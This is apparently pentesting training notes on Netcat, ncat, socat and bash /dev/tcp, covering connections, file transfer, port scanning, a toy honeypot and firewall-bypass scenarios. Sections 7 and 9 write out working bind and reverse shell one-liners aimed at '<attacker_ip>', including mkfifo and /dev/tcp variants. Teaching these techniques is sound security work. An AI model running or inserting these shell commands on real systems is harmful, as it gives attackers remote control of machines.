# Swiss Army Knife for Pentesters

> **Focus:** using multi-purpose tools (like Netcat) to establish connections, scan networks, transfer files, and more during penetration tests.

---

## Table of Contents
1. [Port Forwarding](#1-port-forwarding)
2. [Swiss Army Knife Concept](#2-swiss-army-knife-concept)
3. [Netcat](#3-netcat)
4. [UDP & File Transfer](#4-udp--file-transfer)
5. [Port Scanning](#5-port-scanning)
6. [Honeypot](#6-honeypot)
7. [Bind vs Reverse Shell](#7-bind-vs-reverse-shell)
8. [Beating Firewalls with Netcat](#8-beating-firewalls-with-netcat)
9. [Additional Swiss Army Knife-style Tools](#9-additional-swiss-army-knife-style-tools)

---

## 1 – Port Forwarding

### What is Port Forwarding?
Port forwarding allows traffic from outside a network to reach a specific device inside a local network by configuring the router to forward incoming packets on a port to an internal IP and port.

**Why it matters:**  
Penetration testers often need to pivot or access services hidden behind NAT/firewalls.

### Example Scenario

```
+-----------------------+        +-------------------------+
|       Internet        |  <---> |     Router (NAT)        |
+-----------------------+        +-------------------------+
                                      |
                                      | forwards port 2222 -> 192.168.0.10:22
                                      |
                            +----------------------+
                            | Local Network        |
                            | Device: 192.168.0.10 |
                            | SSH server on :22    |
                            +----------------------+
```

---

## 2 – Swiss Army Knife Concept

### Why "Swiss Army Knife"?
A Swiss Army Knife packs multiple tools into a single device.  
Similarly, certain pentesting utilities pack multiple networking features into a single binary.

### Swiss Army Knife for Pentesters
Tools like `netcat`, `ncat`, `socat`, `cryptcat`, and `sbd` allow you to:

- Establish and receive connections  
- Perform banner grabbing  
- Set up simple chat sessions  
- Transfer files over TCP/UDP  
- Deploy basic honeypots  
- Scan ports  
- Execute remote commands

---

## 3 – Netcat

### About Netcat
Netcat (often installed as `nc`, `netcat`, or `nc.traditional`) is a minimalistic networking utility available by default on most Linux distros.  
There are also Windows binaries (`nc.exe`).

---

### Example: Connecting to a Service
Connect to an FTP server on port 21:

```bash
nc www.businesscorp.com.br 21
```

---

### Chat Over Netcat
You can use Netcat to set up a rudimentary chat between two machines.

#### On the listener:
```bash
nc -l -p 4444
```

#### On the client:
```bash
nc 192.168.0.10 4444
```

---

### IP Logger Example
```bash
nc -l -p 5555 > connections.txt
```
Any incoming data will be saved into `connections.txt`.

---

### Transfer Files (TCP)
#### Listener (receiving the file)
```bash
nc -l -p 6666 > received_file.txt
```
#### Sender
```bash
nc 192.168.0.10 6666 < file_to_send.txt
```

---

## 4 – UDP & File Transfer

### Opening a UDP port
```bash
nc -vnlup 53
```

### Connecting via UDP
```bash
nc -vnu <ip> 53
```

### Transferring a file over UDP (quick example)
#### On the receiver
```bash
nc -u -l -p 1234 > received_file.txt
```
#### On the sender
```bash
nc -u <ip> 1234 < file_to_send.txt
```

---

## 5 – Port Scanning

Netcat can be used as a simple port scanner:

```bash
nc -vnz <ip> 80
```

### Scan a range of ports
```bash
nc -vnz <ip> 20-100
```

### Scan common ports on multiple hosts
You can combine with `xargs`:
```bash
echo 192.168.0.{1..10} | xargs -n1 -I{} nc -vnz {} 22-25
```

---

## 6 – Honeypot

You can use Netcat to create a very simple honeypot that captures anything sent to it.

```bash
nc -l -p 8080 > log.txt
```

Any data sent will be saved into `log.txt`.  
You can also send an initial message to confuse attackers:

```bash
while true; do echo "Welcome to HTTP Server" | nc -l -p 8080 >> connections.log; done
```

---

## 7 – Bind vs Reverse Shell

### Bind Shell
Target listens on a port and waits for the attacker to connect.  
- **Attacker initiates the connection.**

#### Example with Netcat:
```bash
nc -vnlp 5050 -e /bin/bash
```
Then the attacker connects:
```bash
nc <target_ip> 5050
```

---

### Reverse Shell
Target initiates a connection back to the attacker and sends a shell.  
- **Useful to bypass inbound firewall restrictions.**

#### On attacker machine (listening):
```bash
nc -vnlp 5050
```

#### On target machine:
```bash
nc <attacker_ip> 5050 -e /bin/bash
```

---

### More Bind & Reverse Shell Examples

#### Using `mkfifo` to avoid disabled `-e`
```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 5050 > /tmp/f
```
---

## 8 – Beating Firewalls with Netcat

### Scenario 01 – Basic Firewall

On a computer without a firewall, it's easy to open a Bind Shell. But with a basic firewall active, this technique stops working. In the next scenario, we'll see how to get around this.

---

### Scenario 02 – "Closed" Port as an Advantage

- Run `rule2.sh`
- Direct access no longer works
- Now we have a port **allowed** by the firewall, but it's **closed** (NMAP returns RST-ACK)
- The strategy here is to **use this port anyway**, forcing it open for Bind Shell usage

---

### Scenario 03 – Completely Blocked Entry

- Run `rule3.sh`
- No port accepts connections
- Solution: use a **Reverse Shell**, making the **server connect back to us**

---

### Scenario 04 – Totally Restrictive Firewall (inbound and outbound blocked)

- Run `rule4.sh`
- Neither Bind nor Reverse work
- Strategy: test **common ports (80, 443, 53...)** and different protocols to understand what the firewall allows
- This is a scenario for exploring the firewall itself

---

## 9 – Additional Swiss Army Knife-style Tools

### NCAT vs NETCAT

- **NCAT** has encryption (SSL) and `--allow` to limit IPs that can connect
- Shell with SSL makes interception by security systems difficult
- `--allow <ip>` prevents unwanted connections

---

### SOCAT

- Robust alternative to Netcat/NCAT
- Support for multiple protocols: TCP, UDP, etc.
- Allows Bind and Reverse Shells
- Built-in tunneling, useful for firewall bypass and encapsulation

---

### TELNET

- Another option to connect to services
- Also allows shell interaction, although less flexible

---

### /dev/tcp/

- Native Bash feature to create TCP connections
- Example for reverse shell:
```bash
bash -i > /dev/tcp/<ip>/<port> 0>&1 2>&1
```

- Redirections:
  - `0` = STDIN
  - `1` = STDOUT
  - `2` = STDERR
